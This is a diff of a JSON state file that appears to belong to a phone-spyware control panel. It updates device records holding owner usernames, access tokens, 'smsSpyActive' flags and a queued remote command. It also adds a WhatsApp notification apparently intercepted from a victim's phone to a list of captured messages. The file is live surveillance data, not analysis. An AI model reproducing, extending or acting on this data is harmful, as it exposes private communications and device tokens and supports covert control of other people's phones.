@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776843313929,
+    "lastSeen": 1776843320332,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Pegasus-X Room: Membalas Anda",
+        "content": "~ P1: Tidak ditemukan. Coba spesifikkan nama kecamatan (mis: Gajahmungkur).\nGunakan nama kecamatan, bukan kabupaten/provinsi!",
+        "time": "22/04 15:35",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776843322852
+      },
       {
         "appName": "WhatsApp",
         "sender": "7Sex Message",
@@ -3666,14 +3674,14 @@
     "deviceName": "TECNO LE7",
     "ownerUsername": "Zal7Sex",
     "token": "7df00b3b83b2767d3665c31cb098e2ed",
-    "lastSeen": 1776843311775,
+    "lastSeen": 1776843320861,
     "commandQueue": [
       {
         "type": "flashlight",
         "payload": {
-          "state": "on"
+          "state": "off"
         },
-        "sentAt": 1776843313331
+        "sentAt": 1776843321576
       }
     ],
     "online": true,
